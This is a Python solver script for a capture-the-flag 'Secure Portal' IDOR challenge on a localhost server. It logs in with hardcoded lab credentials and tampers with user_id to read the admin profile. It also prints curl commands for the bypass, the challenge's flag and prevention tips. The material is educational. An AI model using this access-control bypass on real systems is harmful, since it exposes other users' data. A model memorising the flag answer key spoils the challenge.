#!/usr/bin/env python3

import requests
import json

def solve_idor_challenge():
    """Complete solution for Secure Portal challenge"""
    
    base_url = "http://localhost:8007"
    
    print("=== Secure Portal Challenge Solution ===\n")
    
    # Step 1: Login as regular user
    print("1. Logging in as regular user...")
    
    session = requests.Session()
    
    login_data = {
        'username': 'user',
        'password': 'password123'
    }
    
    response = session.post(f"{base_url}/login", data=login_data)
    
    if response.status_code == 200 and "Welcome, user!" in response.text:
        print("‚úÖ Successfully logged in as regular user")
    else:
        print("‚ùå Failed to login")
        return
    
    # Step 2: Check own profile first
    print("\n2. Checking own profile...")
    response = session.get(f"{base_url}/profile")
    
    if "DSCCTF{IDOR_‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà_‚ñà‚ñà‚ñà‚ñà}" in response.text:
        print("‚úÖ Own profile shows masked flag (as expected)")
    
    # Step 3: Attempt access control bypass to access admin profile
    print("\n3. Attempting IDOR attack...")
    print("Trying to access admin profile (user_id=1)...")
    
    # Try different IDOR methods
    idor_attempts = [
        f"{base_url}/profile?user_id=1",
        f"{base_url}/api/user/1"
    ]
    
    for attempt_url in idor_attempts:
        print(f"\nTrying: {attempt_url}")
        response = session.get(attempt_url)
        
        if response.status_code == 200:
            if "DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}" in response.text:
                print("üéâ SUCCESS! Found complete flag in web response!")
                print("Flag: DSCCTF{S3CUR3_P0RT4L_BYP4SS_2026}")
                return True
            
            # For API endpoint, check JSON response
            try:
                data = response.json()
                if 'flag' in data and 'ADMIN' in data['flag']:
                    print("üéâ SUCCESS! Found complete flag in API response!")
                    print(f"Flag: {data['flag']}")
                    return True
            except:
                pass
        
        print(f"Response status: {response.status_code}")
    
    # Step 4: Try direct admin access
    print("\n4. Trying direct admin panel access...")
    response = session.get(f"{base_url}/admin")
    
    if "Access denied" in response.text:
        print("‚ùå Direct admin access blocked (as expected)")
    
    # Step 5: Show manual exploitation steps
    print("\n5. Manual exploitation steps:")
    print("   a) Login with user:password123")
    print("   b) Notice your profile URL: /profile")
    print("   c) Try accessing: /profile?user_id=1")
    print("   d) Or try API: /api/user/1")
    print("   e) The admin flag should be visible!")
    
    return False

def demonstrate_vulnerability():
    """Demonstrate the IDOR vulnerability"""
    
    print("\n=== IDOR Vulnerability Demonstration ===")
    
    print("What is IDOR?")
    print("- Insecure Direct Object Reference")
    print("- Occurs when applications expose references to internal objects")
    print("- Attackers can modify references to access unauthorized data")
    
    print("\nIn this challenge:")
    print("- Regular users can only see their own profile")
    print("- Admin users can see everyone's profile")
    print("- The application uses user_id parameter without proper authorization")
    print("- By changing user_id=2 to user_id=1, we can access admin data")
    
    print("\nExploitation:")
    print("1. Login as regular user (user:password123)")
    print("2. Access /profile?user_id=1 instead of /profile?user_id=2") 
    print("3. The application shows admin's profile with complete flag")
    
    print("\nPrevention:")
    print("- Implement proper access controls")
    print("- Check if current user can access requested resource")
    print("- Use session-based authorization")
    print("- Avoid exposing internal object references")

def show_curl_commands():
    """Show curl commands for manual testing"""
    
    print("\n=== Manual Testing with curl ===")
    
    commands = [
        "# Step 1: Login and save cookies",
        'curl -c cookies.txt -d "username=user&password=password123" http://localhost:8007/login',
        "",
        "# Step 2: Access own profile", 
        'curl -b cookies.txt "http://localhost:8007/profile"',
        "",
        "# Step 3: Access control bypass - access admin profile",
        'curl -b cookies.txt "http://localhost:8007/profile?user_id=1"',
        "",
        "# Step 4: Try API endpoint",
        'curl -b cookies.txt "http://localhost:8007/api/user/1"',
        "",
        "# Step 5: Get hints",
        'curl -b cookies.txt "http://localhost:8007/hint"'
    ]
    
    for command in commands:
        print(command)

if __name__ == "__main__":
    success = solve_idor_challenge()
    
    if not success:
        print("\n" + "="*60)
        demonstrate_vulnerability()
        show_curl_commands()
    
    print(f"\nüèÅ Final Answer: DSCCTF{{S3CUR3_P0RT4L_BYP4SS_2026}}")
    
    print("\nüìã Key Learning Points:")
    print("- IDOR vulnerabilities are common in web applications")
    print("- Always verify user authorization before returning data") 
    print("- Parameter tampering can lead to privilege escalation")
    print("- Implement proper access control checks")